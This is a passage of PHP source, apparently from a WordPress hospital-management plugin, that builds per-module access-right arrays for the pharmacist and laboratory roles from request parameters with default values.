										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:0,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:0,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:1,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:0,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										 "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:1,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									    "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:0,
										"add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:0,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:0,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:1,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
										"menu_title"=>'Diagnosis',
										"page_link"=>'diagnosis',
										"own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST[ 'diagnosis_own_data']:0,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:0,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:0,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:0,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:0
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:1,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:1,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										 "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:0,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:1,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:1,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									   "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:0,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:0,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										 "own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:0,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),
							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										 "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										  "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:0,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:1,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:1,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:1,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										 "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:0,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:1,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									   "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										 "add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:1,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
						];		
				$role_access_right_pharmacist = array();
	
				$role_access_right_pharmacist['pharmacist'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							            "page_link"=>'doctor',
										"own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:0,
									    "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						    "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									  "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:0,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:0,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										 "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
							               "menu_title"=>'Pharmacist',
										   "page_link"=>'pharmacist',
										   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:1,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										  "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								         "menu_title"=>'Accountant',
										 "page_link"=>'accountant',
										 "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:0,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:1,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:1,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:1
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										   "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:0,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:0,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:0,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:1,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										  "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:0,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									    "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:0,
										 "add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:0,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:0,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:0,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:0,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:0,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:0,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:0,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:0
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:0,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:0,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										  "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:0,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:0,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:0,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									    "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:0,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:0,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										 "own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:0,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),
							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										  "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										  "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:0,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:0,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:0,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:0,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										  "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:0,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:0,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									   "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										 "add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:0,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
								];
					$role_access_right_laboratories = array();

					$role_access_right_laboratories['laboratories'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									   "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:0,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						  "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									   "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:0,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:0,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										  "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
							               "menu_title"=>'Pharmacist',
										   "page_link"=>'pharmacist',
										   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										 "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:1,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								         "menu_title"=>'Accountant',
										 "page_link"=>'accountant',
										  "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:0,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:0,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:0,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										  "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										  "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:0,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:0,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:0,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:1,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
